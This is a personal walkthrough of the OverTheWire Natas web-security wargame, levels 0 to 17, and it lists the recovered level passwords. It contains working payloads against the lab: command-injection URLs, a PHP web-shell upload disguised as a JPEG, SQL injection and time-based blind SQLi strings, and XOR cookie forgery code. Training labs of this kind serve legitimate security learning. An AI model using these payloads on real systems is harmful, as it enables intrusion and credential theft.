## Natas 0
Intro level explaining the rules.
`natas0:natas0` -> creds given to start the challenge

```
You can find the password for the next level on this page. 
```
Hidden in an html comment
`<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->`


## Natas 1
```
You can find the password for the next level on this page, but rightclicking has been blocked! 
```

hidden in an html comment
`The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7`


## Natas 2
```
There is nothing on this page 
```

There is a reference to `files/pixel.png`. Let's check out the `/files` directory. We find `users.txt` in it with the content
```
# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

`natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q`

## Natas 3
```
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
```

Aha! This is a big hint. Let's checkout `robots.txt`!
```
User-agent: *
Disallow: /s3cr3t/
```

In that directory is `users.txt` which contains `natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm`

## Natas 4
```
Access disallowed. 
You are visiting from "" while authorized users should 
come only from "http://natas5.natas.labs.overthewire.org/"
```

We need to change our `Referer` header to `http://natas5.natas.labs.overthewire.org/` then resend the request.
`natas5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
`
## Natas 5
`Access disallowed. You are not logged in`
Check the cookies

In `cookies` -> `loggedin:0`. Change loggedin to `1` and resend the request.
`natas6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR`


## Natas 6
This page has an input box labeled `Input Secret`. There is also a link to view the page's source code.
It appears that if I enter the correct secret then the password will display. I can see that there is a
`includes/secret.inc` page. If I request it then I can see
```
<!--?$secret = "FOEIUWGHFEEUHOFUOIU";?-->
```
`natas7:jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr`

## Natas 7

Hidden in a comment on this page is
```
 hint: password for webuser natas8 is in /etc/natas_webpass/natas8
```

It looks like we can insert pages in the url param `page` and see their contents. Let's try it with the
page that the hint recommended.
`http://natas7.natas.labs.overthewire.org/index.php?page=` 

`http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8`

Success! `natas8:a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB`

## Natas 8
Another page with a secret to input. We can view the page source.
```
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```

In CyberChef we can take `3d3d516343746d4d6d6c315669563362` and apply `From Hex`->`Reverse`->`From Base64`
to get `oubWYf2kBq`. Input this secret and we get `natas9:Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd`


## Natas 9
There was a search page where you could enter words and search a dictionary. 
```
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
</pre>
```

In the Url, I saw that whatever you entered in the search bar would appear here. For example, I entered `test`.
`http://natas9.natas.labs.overthewire.org/?needle=test&submit=Search`. From here I messed around a bit and then decided
to try to break the string being executed by using a `|`. I was able to get command injection be entering `| ls;`. From there I
messed around until I hit `[http://natas9.natas.labs.overthewire.org/?needle=|%20cat%20.htpasswd;&submit=Search](http://natas9.natas.labs.overthewire.org/?needle=|%20cat%20/etc/natas_webpass/natas10;&submit=Search)`,
which got me the credentials.

`natas10:D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE`
## Natas 10
They are filtering some input this time.

```
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
</pre>
```
(Walkthrough consulted: https://hackmethod.com/overthewire-natas-10/?v=7516fd43adaa)
You can insert a param to search for and an additional file since we control part of the input string. So we choose to search the password file for the password we need.
```
http://natas10.natas.labs.overthewire.org/?needle=a+%2Fetc%2Fnatas_webpass%2Fnatas11&submit=Search
```
`natas11:1KFqoJXi6hRaPluAmk8ESDW4fSysRoIg`
## Natas 11

We have a cookie `data:MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D`
The source code shows that there is a php array with the parameters `bgcolor` and `showpassword` fields.
We can take the source code and attempt to move it around in a way that we can leak the xor key:
```
<?php
// Enter your code here, enjoy!
function xor_encrypt($in) {
    $key = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$text = xor_encrypt(base64_decode("MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY%3D"));
echo $text;
?>
```
If we xor the ciphertext with the plaintext then we can get the xor key(see below).
`KNHLKNHLKNHLKNHLKYBE@IOBKOVPTJHLKNHJ`


Looks like the xor key is `KNHL`;

With this in mind, we change the array's contents to what we want it to be. Then we encode it and paste it in our browser as the cookie.
When we refresh the page, we get the password for the next level!

Final code to encode cookie to win level:
```
<?php
// Enter your code here, enjoy!
function xor_encrypt($in) {
	$key = "KNHL";
    #$key = json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"));
    $text = $in;
    $outText = '';

    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}
$text = xor_encrypt((json_encode(array("showpassword"=>"yes", "bgcolor"=>"#ffffff"))));
$text = base64_encode($text);
echo $text;
?>
```
Which outputs -> `MGw7JCQ5OC04PT8jOSpqdmk3LT9pYmouLC0nICQ8anZpbS4qLSguKmkz`
                 
```
The password for natas12 is YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG
```
## Natas 12
In this level, we can upload .jpg files. I think we can insert some php into the file and get it to execute, but we need to figure out how to do that. I tried putting php code straight into a jpeg and it wasn't executing. I was getting an error that the file was corrupted/not valid when I tried to fetch it after uploading it. 

I looked at the request and saw the php code in the file contents (see below).
```
-----------------------------15908999069113911571958988686
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------15908999069113911571958988686
Content-Disposition: form-data; name="filename"

9ubu9znqvx.php
-----------------------------15908999069113911571958988686
Content-Disposition: form-data; name="uploadedfile"; filename="12.jpg"
Content-Type: image/jpeg

<?php echo exec("cat /etc/passwd"); ?>

-----------------------------15908999069113911571958988686--
```
I then changed the `jpg` extention in the middle to `php` and then I saw it was reflected in the link returned.
With the above changes, I was able to get RCE.


I changed the code to leak the natas13 password and sent the request.
```
-----------------------------311158784333671107472627535479
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------311158784333671107472627535479
Content-Disposition: form-data; name="filename"

9ubu9znqvx.php
-----------------------------311158784333671107472627535479
Content-Disposition: form-data; name="uploadedfile"; filename="12.jpeg"
Content-Type: image/jpeg

<?php echo exec("cat /etc/natas_webpass/natas13"); ?>

-----------------------------311158784333671107472627535479--
```

`natas13:lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9`

## Natas 13
This is very similar to the last challenge but they are checking to ensure the file submitted is a jpeg.
```
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);

    $err=$_FILES['uploadedfile']['error'];
    if($err){
        if($err === 2){
            echo "The uploaded file exceeds MAX_FILE_SIZE";
        } else{
            echo "Something went wrong :/";
        }
    } else if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
        echo "File is not an image";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>
```
As you can see in the code above, the check if the file is of type `exif_imagetype`. I tried using the same .jpeg file with the php code in it and the file wasn't allowed to be uploaded. I looked on wikipedia for the magic bytes of a jpeg file and found they are `FF D8 FF DB`. I used hexedit to append thes bytes to the front of the .jpeg file with my php code in it. When I uploaded the file it worked!!!
```
-----------------------------407631586217772423313341340899
Content-Disposition: form-data; name="MAX_FILE_SIZE"

1000
-----------------------------407631586217772423313341340899
Content-Disposition: form-data; name="filename"

0bdtv084wp.php
-----------------------------407631586217772423313341340899
Content-Disposition: form-data; name="uploadedfile"; filename="13.jpeg"
Content-Type: image/jpeg

ÿØÿÛ<?php echo exec("cat /etc/natas_webpass/natas13"); ?>

-----------------------------407631586217772423313341340899--
```

I then did the same trick to resend the http request, changing the .jpeg extension to .php and presto chango we have out creds for the next level.

`natas14:qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP`
## Natas 14 

A basic sqli login form challenge!

```
<?php
if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas14', '<censored>');
    mysqli_select_db($link, 'natas14');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    if(mysqli_num_rows(mysqli_query($link, $query)) > 0) {
            echo "Successful login! The password for natas15 is <censored><br>";
    } else {
            echo "Access denied!<br>";
    }
    mysqli_close($link);
} else {
?>

```

I tried `admin" or "1"="1" --` and got
```
Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, bool given in /var/www/natas/natas14/index.php on line 24
Access denied!
```

I decided to try the same string but with different comment characters to see if that works. I tried `admin" or "1"="1" #` for both fields and got the password!

`natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB`
## Natas 15 

Huh, a sqli challenge where it checks for the existence of a username in the DB
<?php

/*
CREATE TABLE `users` (
  `username` varchar(64) DEFAULT NULL,
  `password` varchar(64) DEFAULT NULL
);
*/

if(array_key_exists("username", $_REQUEST)) {
    $link = mysqli_connect('localhost', 'natas15', '<censored>');
    mysqli_select_db($link, 'natas15');

    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
    if(array_key_exists("debug", $_GET)) {
        echo "Executing query: $query<br>";
    }

    $res = mysqli_query($link, $query);
    if($res) {
    if(mysqli_num_rows($res) > 0) {
        echo "This user exists.<br>";
    } else {
        echo "This user doesn't exist.<br>";
    }
    } else {
        echo "Error in query.<br>";
    }

    mysqli_close($link);
} else {
?>

The string `" or "1"="1" #` gets me the message `This user exists`
`" or "1"="1` -> `This user exists`

* See 15.py

`natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V`
## Natas 16

```
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
```
* see 16.py
XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd
## Natas 17
"natas18" and password LIKE BINARY "8%" and SLEEP(5) #"

`8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq`
## Natas 18
## Natas 19
## Natas 20
## Natas 21
## Natas 22
## Natas 23
## Natas 24
## Natas 25
## Natas 26
## Natas 27
## Natas 28
## Natas 29
## Natas 30
## Natas 31
## Natas 32 
## Natas 33
## Natas 34
